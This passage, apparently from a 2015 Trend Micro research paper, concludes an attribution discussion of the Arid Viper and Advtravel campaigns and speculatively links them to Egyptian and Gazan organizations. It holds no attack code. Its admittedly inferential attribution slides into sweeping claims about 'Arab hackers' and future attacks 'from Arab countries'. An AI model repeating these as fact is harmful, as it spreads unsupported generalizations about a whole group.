intriguing to note the close ties between \nOperations Arid Viper and Advtravel, apart from signs \nof Arabic heritage. We cannot know for sure if the \npeople behind the campaigns operate as separate \ngroups or as individuals though we suspect they are \npart of a larger organization. Several organizations \nwith ties to both Gaza and Egypt, for instance, \nthe Muslim Brotherhood\u2014a transnational Islamist \norganization founded in Egypt in 1928, exist. The \nbrotherhood was legalized in Egypt in 2011 and won \nthe parliamentary elections before the army overthrew \nit in 2013. In 1987, brotherhood-affiliated charities \n\nestablished the Islamic Resistance Movement, \nbetter known as \u201cHamas,\u201d an infamous Palestinian \norganization that has been controlling the Gaza Strip \nsince around 2007.\n\nWhoever the real culprits are, it is clear that they \nare part of the Arab world, evidence of a budding \ngeneration of Arab hackers and malware creators \nintent on taking down their chosen adversaries. \nSome of the black hats\u2014be they mercenaries or \ncybersoldiers\u2014are actively targeting countries such \nas Israel due to political motivations. We have seen all \nof the ingredients of a cyberskirmish guerrilla war that \ngoes unnoticed by mainstream IT security media.\n\nBeyond these specific campaigns, what we found \nmost interesting was that we had disparate groups of \nArab aggressors who used the same infrastructure \nto launch and monitor attacks. This can possibly \nmean two things\u2014the attacks were somehow \nlinked, something that appears unlikely given their \nnature and motivation, or a supra-organization that \nprovides means for Arab parties to commit acts of \ncyberviolence exists, which appears to be the more \nprobable option.\n\nIf our theory holds, we will see a host of cyber attacks \nwith detrimental results stem from Arab countries \nin the near future. Internet users will be stuck in the \nmiddle of a battlefield they do not care much for.\n\nWe can only offer well-informed inferences on \nattribution for now. Nevertheless, one thing is \nvery clear\u2014whether the malware involved was \nsophisticated and stealthy or basic and created by \nbeginners, they both had devastating effects on their \nvictims. Trend Micro will always continue to uncover \nsuch threats in order to make the world safe for the \nexchange of digital information.\n\nii \n\n\u00a9 2015 Trend Micro Incorporated\n\nThe South Korean Fake Banking App Scam Research Paper\fREFERENCES\n\n[1]  The Week Ltd.
